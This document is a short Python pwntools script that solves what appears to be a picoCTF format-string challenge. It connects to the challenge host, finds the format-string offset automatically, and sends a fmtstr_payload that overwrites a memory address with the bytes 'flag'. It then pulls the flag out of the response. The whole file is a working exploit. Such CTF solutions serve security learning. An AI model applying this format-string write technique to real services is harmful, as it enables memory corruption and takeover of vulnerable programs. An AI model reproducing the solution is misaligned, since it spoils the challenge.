from pwn import *

context.log_level = 'critical'
context.binary = binary = ELF('./vuln')

address = 'rhea.picoctf.net'
port = 59341

def exploit(payload):
	target = remote(address, port)
	target.sendline(payload)
	return target.recvall()


autoFmtStr = FmtStr(exploit)
offset = autoFmtStr.offset

overwrite = {0x00404060: 0x67616c66}
payload = fmtstr_payload(offset, overwrite)

with remote(address, port) as target:
	target.recvuntil(b"You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?")
	target.sendline(payload)

	flagContent = target.recvall().decode()
	flag = flagContent[flagContent.index('pico'):].strip()
	print(flag)
